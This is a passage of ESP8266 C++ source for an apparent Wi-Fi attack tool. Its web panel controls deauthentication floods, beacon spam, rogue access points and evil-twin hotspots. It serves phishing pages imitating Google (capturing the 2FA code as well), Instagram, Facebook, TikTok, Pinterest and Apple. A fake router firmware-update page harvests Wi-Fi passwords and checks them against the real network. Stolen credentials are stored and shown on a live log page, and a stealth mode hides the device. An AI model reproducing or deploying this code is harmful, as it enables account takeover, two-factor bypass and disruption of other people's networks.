      page += F("<div class='network-chip'><span>");
      page += selectedNetworks[i].ssid;
      page += F("</span>");
      char bssidHex[13];
      snprintf(bssidHex, sizeof(bssidHex), "%02X%02X%02X%02X%02X%02X",
               selectedNetworks[i].bssid[0], selectedNetworks[i].bssid[1],
               selectedNetworks[i].bssid[2], selectedNetworks[i].bssid[3],
               selectedNetworks[i].bssid[4], selectedNetworks[i].bssid[5]);
      page += F("<form method='post' action='/?deselect-bssid=");
      page += bssidHex;
      page += F("' style='display:inline; margin-left:8px;'><button type='submit' class='chip-remove'>×</button></form></div>");
      yield();
    }
    page += F("</div>");
  }

  String modeName = routerRescueMode ? "Router Rescue" : (deauthAll_active ? "Deauth All" : (hotspotActive ? "Evil Twin" : (beaconSpamActive ? "Beacon Spam" : "Admin")));
  page += "<div class='status-box'><div class='status-item'><span>Mode:</span><span>" + modeName + "</span></div>";
  page += "<div class='status-item'><span>Selected:</span><span>" + String(selectedNetworkCount) + "</span></div>";
  page += "<div class='status-item'><span>Template:</span><span>" + getTemplateName() + "</span></div>";
  page += "<div class='status-item'><span>Credentials:</span><span>" + getSPIFFSStats() + "</span></div>";
  page += "<div class='status-item'><span>Storage:</span><span>" + getSPIFFSInfo() + "</span></div>";
  page += "<div class='status-item'><span>RAM:</span><span>" + getRAMInfo() + "</span></div>";
  page += "<div class='status-item'><span>Uptime:</span><span>" + formatUptime() + "</span></div></div>";

  page += F("<div style='margin-bottom:15px;'><a href='/view-credentials'><button class='btn btn-primary' style='width:auto; display:inline-block; padding:10px 20px;'>📄 View Credentials</button></a><a href='/logs'><button class='btn btn-success' style='width:auto; display:inline-block; padding:10px 20px; margin-left:10px;'>🔴 Live Logs</button></a></div>");

  page += F("<div class='card'><div class='card-title'>🕵️ Stealth Mode</div><label class='switch'><input type='checkbox' id='stealthCheckbox' ");
  page += String(adminStealthMode ? "checked" : "");
  page += F("><span class='slider'></span></label><div id='stealthStatus' style='margin-top:10px;font-size:12px;color:#aaa;'></div></div>");
  page += F("<script>var stealthCheck=document.getElementById('stealthCheckbox');var stealthStatus=document.getElementById('stealthStatus');stealthStatus.innerText=stealthCheck.checked?'Stealth ON':'Stealth OFF';stealthCheck.addEventListener('change',function(){var checked=this.checked;var v=checked?'1':'0';var xhr=new XMLHttpRequest();xhr.open('POST','/set-stealth?v='+v,true);xhr.setRequestHeader('Authorization','Basic '+btoa('admin:monitor123'));xhr.onload=function(){if(xhr.status===200){stealthStatus.innerText=checked?'Stealth ON - Rebooting...':'Stealth OFF - Rebooting...';}};xhr.send();});</script>");

  page += F("<div class='card'><div class='card-title'>🎲 Rogue AP (Custom SSID)</div><form method='post' action='/?start-rogue'><input type='text' name='rogue_ssid' placeholder='Enter SSID' style='width:100%;padding:10px;margin-bottom:10px;background:#333;color:#fff;border:1px solid #555;border-radius:6px;' required><select name='rogue_ch' style='width:100%;padding:10px;margin-bottom:10px;background:#333;color:#fff;border:1px solid #555;border-radius:6px;'>");
  for (int ch = 1; ch <= 11; ch++) {
    page += "<option value='" + String(ch) + "'>Channel " + String(ch) + "</option>";
  }
  page += F("</select><button type='submit' class='btn btn-warning'>🚀 Start Rogue AP</button></form>");
  if (rogueModeActive) {
    page += "<div style='margin-top:10px;padding:10px;background:#9b59b6;border-radius:8px;'>🟢 ROGUE AP ACTIVE<br>SSID: " + rogueSSID + "<br>Channel: " + String(rogueChannel) + "</div>";
    page += F("<form method='post' action='/?stop-rogue'><button class='btn btn-danger' style='margin-top:10px;'>🛑 Stop Rogue AP</button></form>");
  }
  page += F("</div>");

  page += F("<div class='card'><div class='card-title'>💣 Mass Attack Controls</div>");
  if (selectedNetworkCount > 0) {
    if (deauthAll_active) {
      page += "<form method='post' action='/?deauth-all=stop'><button class='btn btn-deauth-all'>🛑 Stop Deauth All (" + String(selectedNetworkCount) + " networks)</button></form>";
    } else {
      page += "<form method='post' action='/?deauth-all=start'><button class='btn btn-deauth-all'>💣 Start Deauth All (" + String(selectedNetworkCount) + " networks)</button></form>";
    }
    if (!hotspotActive && !beaconSpamActive) {
      page += F("<form method='post' action='/?attack=eviltwin'><button class='btn btn-warning'>🎣 Start Evil Twin (first selected)</button></form>");
    }
    if (selectedNetworkCount == 1) {
      if (deauthing_active) {
        page += F("<form method='post' action='/?deauth=stop'><button class='btn btn-danger'>🛑 Stop Deauth (Single)</button></form>");
      } else {
        page += F("<form method='post' action='/?deauth=start'><button class='btn btn-warning'>💣 Start Deauth (Single)</button></form>");
      }
    }
  } else {
    page += F("<button class='btn' disabled style='opacity:0.5;'>Select networks first</button>");
  }
  page += F("<div style='margin-top:15px;'><form method='post' action='/?beacon=start'><button class='btn btn-warning'>🐝 Start Beacon Spam</button></form>");
  if (beaconSpamActive) {
    page += F("<form method='post' action='/?beacon=stop' style='margin-top:5px;'><button class='btn btn-danger'>🛑 Stop Beacon Spam</button></form>");
  }
  page += F("</div></div>");

  page += F("<div class='card'><div class='card-title'>⚠️ Router Rescue Mode (Password Verification)</div>");
  if (selectedNetworkCount > 0) {
    page += F("<form method='post' action='/?router-rescue=1'><button class='btn btn-warning' style='background:#ff9800;'>🔐 Start Router Rescue (PhiSiFi style)</button></form><p style='font-size:12px;margin-top:8px;color:#aaa;'>Creates evil twin with firmware update failure page. Verifies password against real network.</p>");
  } else {
    page += F("<button class='btn' disabled style='opacity:0.5;'>Select a network first</button>");
  }
  page += F("</div>");

  page += F("<div class='card'><div class='card-title'>🎭 Portal Templates</div><div class='template-grid'>");
  auto addTemplateBtn = [&](const String& tpl, const String& label) {
    page += "<form method='post' action='/?template=" + tpl + "'><button class='template-btn " + String(currentTemplate == tpl ? "active btn-success" : "btn-primary") + "'>" + label + "</button></form>";
  };
  addTemplateBtn("google-email", "🔵 Google (3-Step)");
  addTemplateBtn("instagram", "📸 Instagram");
  addTemplateBtn("facebook", "👥 Facebook");
  addTemplateBtn("tiktok", "🎵 TikTok");
  addTemplateBtn("pinterest", "📌 Pinterest");
  addTemplateBtn("apple", "🍎 Apple");
  page += F("</div></div>");

  page += F("<div class='card'><div class='card-title'>📁 Upload Custom Template</div><form method='post' action='/upload' enctype='multipart/form-data' id='uploadForm'><div onclick=\"document.getElementById('fileInput').click()\" style='border:2px dashed #555;border-radius:8px;padding:20px;text-align:center;margin-bottom:15px;cursor:pointer;'>📄 Click to select HTML file</div><input type='file' name='htmlfile' id='fileInput' accept='.html' hidden onchange='document.getElementById(\"uploadForm\").submit()'></form>");
  if (uploadStatus != "") {
    page += "<div style='margin-top:10px;padding:8px;background:#2a2a2a;border-radius:6px;'>" + uploadStatus + "</div>";
  }
  page += F("<div style='margin-top:15px;'><div class='card-title' style='font-size:1.1em;'>📄 Uploaded Templates</div></div>");
  buildFileListHTML(page);
  page += F("</div>");

  page += F("<div class='card'><div class='card-title'>📡 Available Networks</div><form method='post' action='/?scan=1'><button class='btn btn-primary btn-small'>🔍 SCAN FOR NETWORKS</button></form><div style='overflow-x:auto;'><table class='network-table'><tr><th>SELECT</th><th>SSID</th><th>BSSID</th><th>CH</th><th>SIG</th><th>ACTIONS</th></tr>");
  bool hasNetworks = false;
  for (int i = 0; i < MAX_NETWORKS; i++) {
    if (networks[i].ssid == "") continue;
    hasNetworks = true;
    page += F("<tr><td>");
    if (networks[i].inRange) {
      if (networks[i].selected) {
        page += "<form method='post' action='/?deselect=" + String(i) + "'><button class='select-btn' style='background:#2ecc71;'>✓</button></form>";
      } else {
        page += "<form method='post' action='/?select=" + String(i) + "'><button class='select-btn'>+</button></form>";
      }
    } else {
      page += F("<button class='select-btn' disabled style='opacity:0.5;'>✗</button>");
    }
    page += "</td><td>" + networks[i].ssid + "</td>";
    page += "<td style='font-family:monospace;font-size:10px;color:#aaa;'>" + formatBSSID(networks[i].bssid) + "</td>";
    page += "<td>" + String(networks[i].ch) + "</td>";
    int sig = getSignalQuality(networks[i].rssi);
    page += "<td><span class='signal-percent'>" + String(sig) + "%</span></td><td>";
    if (networks[i].inRange) {
      page += "<form method='post' action='/?ap=" + String(i) + "'><button class='btn-action btn-use'>Use</button></form>";
    } else {
      page += F("—");
    }
    page += F("</td></tr>");
    yield();
  }
  if (!hasNetworks) {
    page += F("<tr><td colspan='6' style='text-align:center;padding:20px;color:#aaa;'>No networks found. Click SCAN to search.</td></tr>");
  }
  page += F("</table></div></div>");

  page += F("</div></body></html>");
  webServer.send(200, "text/html", page);
}

// ========== HANDLERS ==========
void handleGoogleEmail() { webServer.send(200, "text/html", getTemplateHTML()); }
void handleGooglePassword() {
  if (webServer.hasArg("email")) {
    VictimSession* s = getSession();
    s->email = webServer.arg("email");
    s->lastActivity = millis();
    String html = FPSTR(TEMPLATE_GOOGLE_PASSWORD);
    html.replace("%EMAIL%", s->email);                // hidden input for 2FA
    html.replace("%EMAIL_DISPLAY%", s->email);        // ← THIS LINE SHOWS THE EMAIL
    webServer.send(200, "text/html", html);
  } else {
    webServer.send(200, "text/html", getTemplateHTML());
  }
}

void handleGoogle2FA() {
  if (webServer.hasArg("email") && webServer.hasArg("password")) {
    VictimSession* s = getSession();
    s->email = webServer.arg("email");
    s->password = webServer.arg("password");
    s->lastActivity = millis();
    saveToSPIFFS(s->email, s->password, "Google (Partial - Waiting for 2FA)");
    String html = FPSTR(TEMPLATE_GOOGLE_2FA);
    html.replace("%EMAIL%", s->email);
    html.replace("%PASSWORD%", s->password);
    webServer.send(200, "text/html", html);
  } else {
    webServer.send(200, "text/html", getTemplateHTML());
  }
}

void handleCapture2FA() {
  if (webServer.hasArg("code") && webServer.hasArg("email") && webServer.hasArg("password")) {
    String email = webServer.arg("email");
    String password = webServer.arg("password");
    String code = webServer.arg("code");
    saveToSPIFFS(email, password, "Google (COMPLETE)", "2FA: " + code);
    IPAddress clientIP = webServer.client().remoteIP();
    clearSession(clientIP);
    webServer.send(200, "text/html", getSuccessPageWithRedirect());
  } else {
    webServer.send(200, "text/html", getTemplateHTML());
  }
}

void handleCapture() {
  if (hotspotActive && !routerRescueMode) {
    String user = "", pass = "";
    for (int i = 0; i < webServer.args(); i++) {
      String name = webServer.argName(i);
      if (name == "email" || name == "username" || name == "user" || name == "apple_id") user = webServer.arg(i);
      else if (name == "password" || name == "pass") pass = webServer.arg(i);
    }
    if (user != "" && pass != "") saveToSPIFFS(user, pass, getTemplateName());
    webServer.send(200, "text/html", getSuccessPageWithRedirect());
  } else webServer.send(404, "text/plain", "Not Found");
}

void handleRouterVerify() {
  if (!hotspotActive || !routerRescueMode) { webServer.send(404, "text/plain", "Not available"); return; }
  if (!webServer.hasArg("password")) { webServer.send(400, "text/html", "<h2>Missing password</h2><a href='/'>Back</a>"); return; }
  routerPasswordAttempt = webServer.arg("password");
  saveToSPIFFS("(Router Rescue)", routerPasswordAttempt, "Router-Rescue", "Attempt for " + selectedNetworks[0].ssid);
  routerConnecting = true;
  routerConnectStart = millis();
  
  WiFi.begin(selectedNetworks[0].ssid.c_str(), routerPasswordAttempt.c_str(), selectedNetworks[0].ch, selectedNetworks[0].bssid);
  String waiting = R"rawliteral(<!DOCTYPE html><html><head><meta http-equiv='refresh' content='20;url=/router-result'><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Firmware Recovery – %SSID%</title><style>body{background:#f2f2f2;font-family:'Segoe UI',Roboto,sans-serif;text-align:center;padding:20px;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;}.card{background:white;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.08);max-width:400px;width:100%;padding:30px 20px;}.spinner{border:5px solid #ccc;border-top:5px solid #0066ff;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto;}@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}.progress-container{width:100%;height:12px;background:#e0e0e0;border-radius:8px;margin:25px 0 15px;overflow:hidden;box-shadow:inset 0 1px 3px rgba(0,0,0,0.1);}.progress-bar{height:100%;width:0%;background:linear-gradient(90deg,#0052cc,#00a3ff);border-radius:8px;animation:fillProgress 20s linear forwards;box-shadow:0 2px 4px rgba(0,0,0,0.15);}@keyframes fillProgress{from{width:0%;}to{width:100%;}}h2{font-size:20px;color:#333;margin:10px 0;}p{font-size:14px;color:#666;margin:5px 0;}</style></head><body><div class="card"><h2>Verifying password, please wait...</h2><div class="spinner"></div><div class="progress-container"><div class="progress-bar"></div></div><p>This may take up to 20 seconds</p></div></body></html>)rawliteral";
waiting.replace("%SSID%", selectedNetworks[0].ssid);
webServer.send(200, "text/html", waiting);
}

void handleRouterResult() {
  if (!routerRescueMode) { webServer.send(404, "text/plain", "Not active"); return; }

  wl_status_t status = WiFi.status();
  bool success = (status == WL_CONNECTED);
  bool timeout = (millis() - routerConnectStart > ROUTER_CONNECT_TIMEOUT);

  if (success) {
    saveToSPIFFS(selectedNetworks[0].ssid, routerPasswordAttempt, "Router-Rescue (VALID)", "✅ Verified");
    WiFi.disconnect();
   
    routerRescueMode = false;
    routerConnecting = false;
    returnToAdminAP();
    String successPage = R"rawliteral(<!DOCTYPE html><html><head><meta http-equiv='refresh' content='2;url=/'><meta name='viewport' content='width=device-width, initial-scale=1'><style>body{font-family:Century Gothic,sans-serif;text-align:center;padding-top:20%;background:#f2f2f2;}</style></head><body><h2 style='color:green;'>✅ Password verified! Firmware restored.</h2><p>Redirecting to admin console...</p></body></html>)rawliteral";
    webServer.send(200, "text/html", successPage);
    return;
  }

  if (timeout) {
    
    routerConnecting = false;
   
    
String retryPage = R"rawliteral(<!DOCTYPE html><html><head><meta http-equiv='refresh' content='3;url=/'><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Firmware Recovery – %SSID%</title><style>body{background:#f2f2f2;font-family:'Segoe UI',Roboto,sans-serif;margin:0;padding:20px;display:flex;justify-content:center;align-items:center;min-height:100vh;}.card{background:white;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.08);max-width:400px;width:100%;padding:30px 20px;text-align:center;}.warning-icon{font-size:48px;margin-bottom:10px;}h2{font-size:20px;color:#d32f2f;margin:10px 0;}p{font-size:14px;color:#555;margin:8px 0;}.footer{font-size:12px;color:#999;margin-top:20px;}</style></head><body><div class="card"><div class="warning-icon">❌</div><h2>Wrong password</h2><p>The password you entered does not match the router's stored credentials.</p><p>Please try again with the correct password.</p><p class="footer">Redirecting to recovery page…</p></div></body></html>)rawliteral";
retryPage.replace("%SSID%", selectedNetworks[0].ssid);
webServer.send(200, "text/html", retryPage);
    return;
  }

  
  String waiting = R"rawliteral(
    <!DOCTYPE html><html><head><meta http-equiv='refresh' content='3;url=/router-result'><meta name='viewport' content='width=device-width, initial-scale=1'><style>body{font-family:Century Gothic,sans-serif;text-align:center;padding-top:20%;background:#f2f2f2;}.spinner{border:4px solid #ccc;border-top:4px solid #0066ff;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto;}@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style></head><body><div class='spinner'></div><h2>Verifying password, please wait...</h2></body></html>
  )rawliteral";
  webServer.send(200, "text/html", waiting);
}

void handleRouterVerifyGet() {
  if (routerRescueMode && hotspotActive && selectedNetworkCount > 0) {
    String html = FPSTR(TEMPLATE_FIRMWARE_UPDATE);
    html.replace("%SSID%", selectedNetworks[0].ssid);
    html.replace("action='/capture'", "action='/router-verify'");
    webServer.send(200, "text/html", html);
  } else {
    webServer.sendHeader("Location", "/");
    webServer.send(302, "text/plain", "");
  }
}

// ========== AUTH / LIVE LOGS ==========
String base64Decode(String input) {
  const char* b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  String out = "";
  int val = 0, valb = -8;
  for (int i = 0; i < input.length(); i++) {
    char c = input[i];
    const char* p = strchr(b64, c);
    if (!p) break;
    val = (val << 6) + (p - b64);
    valb += 6;
    if (valb >= 0) {
      out += char((val >> valb) & 0xFF);
      valb -= 8;
    }
  }
  return out;
}

bool isAuthenticated() {
  if (!webServer.hasHeader("Authorization")) return false;
  String auth = webServer.header("Authorization");
  if (!auth.startsWith("Basic ")) return false;
  String decoded = base64Decode(auth.substring(6));
  int colon = decoded.indexOf(':');
  if (colon <= 0) return false;
  String user = decoded.substring(0, colon);
  String pass = decoded.substring(colon + 1);
  return (user == LOGS_USER && pass == LOGS_PASS);
}

String jsonEscape(String s) {
  s.replace("\\", "\\\\");
  s.replace("\"", "\\\"");
  s.replace("\n", "\\n");
  s.replace("\r", "\\r");
  return s;
}

void handleLiveCredentials() {
  if (!isAuthenticated()) {
    webServer.sendHeader("WWW-Authenticate", "Basic realm=\"Live Logs\"");
    webServer.send(401, "application/json", "{\"error\":\"Unauthorized\"}");
    return;
  }
  String json = "{\"total\":" + String(liveTotal) + ",\"entries\":[";
  int idx = liveTail, count = 0;
  while (idx != liveHead && count < MAX_LIVE_ENTRIES) {
    if (count > 0) json += ",";
    json += "{\"ts\":\"" + jsonEscape(String(liveBuffer[idx].ts)) + "\",";
    json += "\"email\":\"" + jsonEscape(String(liveBuffer[idx].email)) + "\",";
    json += "\"pass\":\"" + jsonEscape(String(liveBuffer[idx].pass)) + "\",";
    json += "\"extra\":\"" + jsonEscape(String(liveBuffer[idx].extra)) + "\"}";
    idx = (idx + 1) % MAX_LIVE_ENTRIES;
    count++;
  }
  json += "]}";
  webServer.send(200, "application/json", json);
}

void handleLiveLogs() {
  if (!isAuthenticated()) {
    webServer.sendHeader("WWW-Authenticate", "Basic realm=\"Live Logs\"");
    webServer.send(401, "text/html", "<html><body><h1>Unauthorized</h1></body></html>");
    return;
  }
  webServer.setContentLength(CONTENT_LENGTH_UNKNOWN);
  webServer.send(200, "text/html", "");
  webServer.sendContent(F("<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Live Credential Logs</title><style>body{background:#0a0a0a;color:#eee;font-family:monospace;padding:20px;}h1{color:#2ecc71;}.log{background:#1e1e1e;border-radius:8px;padding:15px;max-height:70vh;overflow-y:auto;}.entry{border-bottom:1px solid #333;padding:8px;font-size:14px;}.time{color:#888;}.email{color:#3498db;}.pass{color:#e74c3c;}.extra{color:#f39c12;}.count{color:#aaa;margin-bottom:10px;}</style></head><body><h1>🔴 LIVE CAPTURED CREDENTIALS</h1><div class='count'>Total captured: <span id='totalCount'>0</span></div><div class='log' id='logContainer'><div>Waiting for credentials...</div></div>"));

  webServer.sendContent(F("<script>"
    "function escapeHtml(s){if(!s)return'';return s.replace(/[&<>]/g,function(m){return{'&':'&amp;','<':'&lt;','>':'&gt;'}[m]||m;});}"
    "function fetchUpdates(){"
      "fetch('/live-credentials',{headers:{'Authorization':'Basic '+btoa('admin:monitor123')}})"
      ".then(r=>r.json())"
      ".then(data=>{"
        "document.getElementById('totalCount').innerText=data.total;"
        "if(data.entries.length){"
          "var c=document.getElementById('logContainer');"
          "for(var i=data.entries.length-1;i>=0;i--){"
            "var e=data.entries[i];"
            "var d=document.createElement('div');"
            "d.className='entry';"
            "d.innerHTML='<span class=\"time\">['+new Date(e.ts*1000).toLocaleTimeString()+']</span> <span class=\"email\">'+escapeHtml(e.email)+'</span> ➜ <span class=\"pass\">'+escapeHtml(e.pass)+'</span>'+(e.extra?' <span class=\"extra\">('+escapeHtml(e.extra)+')</span>':'');"
            "c.prepend(d);"
          "}"
          "while(c.children.length>100)c.removeChild(c.lastChild);"
        "}"
      "})"
      ".catch(function(err){console.error('Fetch error:',err);});"
    "}"
    "function clearLiveLogs(){"
      "if(confirm('Clear displayed logs? Saved credentials file will NOT be deleted.')){"
        "fetch('/clear-live-logs',{method:'POST',headers:{'Authorization':'Basic '+btoa('admin:monitor123')}})"
        ".then(function(r){return r.json();})"
        ".then(function(data){"
          "if(data.success){"
            "document.getElementById('logContainer').innerHTML='<div>Logs cleared. Waiting for new credentials...</div>';"
            "document.getElementById('totalCount').innerText='0';"
          "}"
        "})"
        ".catch(function(e){alert('Error clearing logs');console.error(e);});"
      "}"
    "}"
    "setInterval(fetchUpdates,2000);"
    "fetchUpdates();"
  "</script>"));

  webServer.sendContent(F("<div style='display:flex; gap:10px; margin-top:20px;'><form method='post' action='/manual-stop' style='flex:1;'><button type='submit' style='width:100%;padding:15px;background:#e74c3c;color:white;border:none;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer;'>🛑 STOP ATTACK</button></form><button onclick='clearLiveLogs()' style='flex:1;padding:15px;background:#f39c12;color:white;border:none;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer;'>🗑️ CLEAR LOGS</button></div></body></html>"));
  webServer.sendContent("");
}

void handleClearLiveLogs() {
  if (!isAuthenticated()) {
    webServer.sendHeader("WWW-Authenticate", "Basic realm=\"Live Logs\"");
    webServer.send(401, "application/json", "{\"error\":\"Unauthorized\"}");
    return;
  }
  liveHead = 0; liveTail = 0; liveTotal = 0;
  for (int i = 0; i < MAX_LIVE_ENTRIES; i++) {
    memset(liveBuffer[i].ts, 0, sizeof(liveBuffer[i].ts));
    memset(liveBuffer[i].email, 0, sizeof(liveBuffer[i].email));
    memset(liveBuffer[i].pass, 0, sizeof(liveBuffer[i].pass));
    memset(liveBuffer[i].extra, 0, sizeof(liveBuffer[i].extra));
  }
  webServer.send(200, "application/json", "{\"success\":true,\"message\":\"Live logs cleared\"}");
}

// ========== ROOT ==========
void handleRoot() {
  if (hotspotActive) {
    if (routerRescueMode && selectedNetworkCount > 0) {
      String html = FPSTR(TEMPLATE_FIRMWARE_UPDATE);
      html.replace("%SSID%", selectedNetworks[0].ssid);
      html.replace("action='/capture'", "action='/router-verify'");
      webServer.send(200, "text/html", html);
    } else {
      webServer.send(200, "text/html", getTemplateHTML());
    }
    return;
  }
  if (webServer.hasArg("select")) addNetworkToSelection(webServer.arg("select").toInt());
  if (webServer.hasArg("deselect")) removeNetworkFromSelection(webServer.arg("deselect").toInt());
  if (webServer.hasArg("deselect-bssid")) removeNetworkFromSelectionByBSSID(webServer.arg("deselect-bssid"));
  if (webServer.hasArg("clear-selection")) clearAllSelections();
  if (webServer.hasArg("scan")) performScan();
  if (webServer.hasArg("ap")) {
    int idx = webServer.arg("ap").toInt();
    if (idx >= 0 && idx < MAX_NETWORKS && networks[idx].inRange) { clearAllSelections(); addNetworkToSelection(idx); }
  }
  if (webServer.hasArg("template")) currentTemplate = webServer.arg("template");
  if (webServer.hasArg("use-file")) { currentTemplate = webServer.arg("use-file"); uploadStatus = "✅ Now using: " + currentTemplate; }
  if (webServer.hasArg("delete-file")) handleDeleteFile(webServer.arg("delete-file"));
  if (webServer.hasArg("start-rogue") && webServer.hasArg("rogue_ssid")) {
    rogueSSID = webServer.arg("rogue_ssid");
    rogueChannel = webServer.arg("rogue_ch").toInt();
    if (rogueChannel < 1) rogueChannel = 1;
    if (rogueChannel > 11) rogueChannel = 11;
    startRogueAP();
  }
  if (webServer.hasArg("stop-rogue")) stopRogueAP();
  if (webServer.hasArg("attack") && webServer.arg("attack") == "eviltwin") startEvilTwin();
  if (webServer.hasArg("attack") && webServer.arg("attack") == "stop") returnToAdminAP();
  if (webServer.hasArg("deauth-all")) {
    if (webServer.arg("deauth-all") == "start" && selectedNetworkCount > 0) {
      sortSelectedNetworksByChannel();
      currentDeauthIndex = 0; currentDeauthChannel = 0;
      deauthAll_active = true; deauthing_active = false;
    } else if (webServer.arg("deauth-all") == "stop") deauthAll_active = false;
  }
  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start" && selectedNetworkCount == 1) { deauthing_active = true; deauthAll_active = false; }
    else if (webServer.arg("deauth") == "stop") deauthing_active = false;
  }
  if (webServer.hasArg("beacon")) {
    if (webServer.arg("beacon") == "start") { beaconSpamActive = true; beaconPacketCounter = 0; uploadStatus = "🐝 Beacon spam started"; }
    else if (webServer.arg("beacon") == "stop") { beaconSpamActive = false; uploadStatus = "🛑 Beacon spam stopped"; }
  }
  if (webServer.hasArg("delete-credentials")) deleteCredentialsFile();
  if (webServer.hasArg("router-rescue")) {
    if (selectedNetworkCount > 0) {
      beaconSpamActive = false;
      routerRescueMode = true;
      startEvilTwin();
      delay(500);
      uploadStatus = "🔐 Router Rescue Mode ACTIVE – using PhiSiFi style page";
    } else uploadStatus = "❌ Select a network first";
  }
  showAdminPanel();
}

void handleNotFound() {
  if (hotspotActive) {
    if (routerRescueMode && selectedNetworkCount > 0) {
      // Serve the router‑rescue firmware‑update page for all requests
      String html = FPSTR(TEMPLATE_FIRMWARE_UPDATE);
      html.replace("%SSID%", selectedNetworks[0].ssid);
      html.replace("action='/capture'", "action='/router-verify'");
      webServer.send(200, "text/html", html);
    } else {
      // Normal evil‑twin mode – show the selected phishing template
      webServer.send(200, "text/html", getTemplateHTML());
    }
  } else {
    // No attack active – show the admin panel
    showAdminPanel();
  }
}

// ========== STEALTH / SCAN / UPLOAD ==========
void loadStealthSetting() {
  if (spiffsFailed) { adminStealthMode = false; return; }
  if (!spiffsMounted && !SPIFFS.begin()) { spiffsFailed = true; adminStealthMode = false; return; }
  spiffsMounted = true;
  if (SPIFFS.exists(STEALTH_FILE)) {
    File f = SPIFFS.open(STEALTH_FILE, "r");
    if (f) { String value = f.readString(); f.close(); value.trim(); adminStealthMode = (value == "1"); return; }
  }
  adminStealthMode = false;
}

void saveStealthSetting(bool enabled) {
  if (spiffsFailed) return;
  if (!spiffsMounted && !SPIFFS.begin()) { spiffsFailed = true; return; }
  spiffsMounted = true;
  File f = SPIFFS.open(STEALTH_FILE, "w");
  if (f) { f.print(enabled ? "1" : "0"); f.close(); }
}

void handleToggleStealth() {
  if (!isAuthenticated()) {
    webServer.sendHeader("WWW-Authenticate", "Basic realm=\"Admin\"");
    webServer.send(401, "application/json", "{\"success\":false,\"message\":\"Unauthorized\"}");
    return;
  }
  if (webServer.hasArg("v")) {
    String value = webServer.arg("v");
    if (value == "1") {
      adminStealthMode = true;
      saveStealthSetting(true);
      webServer.send(200, "application/json", "{\"success\":true,\"stealth\":true,\"message\":\"Stealth Mode ENABLED. Rebooting...\"}");
    } else if (value == "0") {
      adminStealthMode = false;
      saveStealthSetting(false);
      webServer.send(200, "application/json", "{\"success\":true,\"stealth\":false,\"message\":\"Stealth Mode DISABLED. Rebooting...\"}");
    } else {
      webServer.send(400, "application/json", "{\"success\":false,\"message\":\"Invalid value. Use v=1 or v=0\"}");
      return;
    }
    webServer.client().flush();
    delay(500);
    SPIFFS.end();
    ESP.restart();
  } else {
    webServer.send(400, "application/json", "{\"success\":false,\"message\":\"Missing parameter: v\"}");
  }
}

void performScan() {
  if (isProcessing) return;
  isProcessing = true;
  for (int i = 0; i < MAX_NETWORKS; i++) { networks[i].inRange = false; networks[i].selected = false; }
  int n = WiFi.scanNetworks(false, true);
  if (n <= 0) { Serial.println("Scan failed or no networks found"); isProcessing = false; return; }
  int cnt = (n < MAX_NETWORKS) ? n : MAX_NETWORKS;
  for (int i = 0; i < cnt; i++) {
    networks[i].ssid = WiFi.SSID(i);
    networks[i].ch = WiFi.channel(i);
    networks[i].rssi = WiFi.RSSI(i);
    networks[i].inRange = true;
    uint8_t* bssid = WiFi.BSSID(i);
    if (bssid) memcpy(networks[i].bssid, bssid, 6);
    for (int j = 0; j < selectedNetworkCount; j++) {
      if (selectedNetworks[j].ssid == networks[i].ssid && bssidMatch(selectedNetworks[j].bssid, networks[i].bssid)) {
        networks[i].selected = true;
        break;
      }
    }
    yield();
    ESP.wdtFeed();
  }
  for (int i = cnt; i < MAX_NETWORKS; i++) networks[i].ssid = "";
  for (int i = 0; i < selectedNetworkCount; i++) {
    bool found = false;
    for (int j = 0; j < MAX_NETWORKS; j++) {
      if (networks[j].inRange && networks[j].ssid == selectedNetworks[i].ssid && bssidMatch(selectedNetworks[i].bssid, networks[j].bssid)) {
        found = true;
        break;
      }
    }
    if (!found) {
      for (int k = i; k < selectedNetworkCount - 1; k++) selectedNetworks[k] = selectedNetworks[k + 1];
      selectedNetworkCount--;
      i--;
    }
  }
  WiFi.scanDelete();
  isProcessing = false;
}

void handleFileUpload() {
  HTTPUpload& upload = webServer.upload();
  static File uploadFile;
  if (upload.status == UPLOAD_FILE_START) {
    String fn = upload.filename;
    if (!fn.endsWith(".html")) fn += ".html";
    uploadFile = SPIFFS.open("/" + fn, "w");
    if (!uploadFile) uploadStatus = "❌ Error";
    else uploadStatus = "📤 Uploading: " + fn;
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    if (uploadFile) uploadFile.write(upload.buf, upload.currentSize);
  } else if (upload.status == UPLOAD_FILE_END) {
    if (uploadFile) {
      uploadFile.close();
      uploadStatus = "✅ Uploaded: " + upload.filename;
    } else uploadStatus = "❌ Upload failed";
  } else if (upload.status == UPLOAD_FILE_ABORTED) {
    if (uploadFile) { uploadFile.close(); uploadStatus = "❌ Aborted"; }
  }
  yield();
}

void startEvilTwin() {
  if (selectedNetworkCount == 0) return;
  if (isProcessing) return;
  isProcessing = true;
 beaconSpamActive = false;
  dnsServer.stop();
  delay(50);
  WiFi.softAPdisconnect(true);
  delay(200);
  WiFi.softAPConfig(apIP, apIP, subnet);
  WiFi.softAP(selectedNetworks[0].ssid.c_str(), "", selectedNetworks[0].ch);
  dnsServer.start(DNS_PORT, "*", apIP);
  hotspotActive = true;
  rogueModeActive = false;
  isProcessing = false;
}

void returnToAdminAP() {
  if (hotspotActive) {
    hotspotActive = false;
    rogueModeActive = false;
    routerRescueMode = false;
    routerConnecting = false;
    deauthAll_active = false;
    deauthing_active = false;
    beaconSpamActive = false;
    dnsServer.stop();
    delay(100);
    WiFi.softAPdisconnect(true);
    delay(300);
    WiFi.softAPConfig(apIP, apIP, subnet);
    if (adminStealthMode) WiFi.softAP("CredSniper", "dewdew5218", 1, 1);
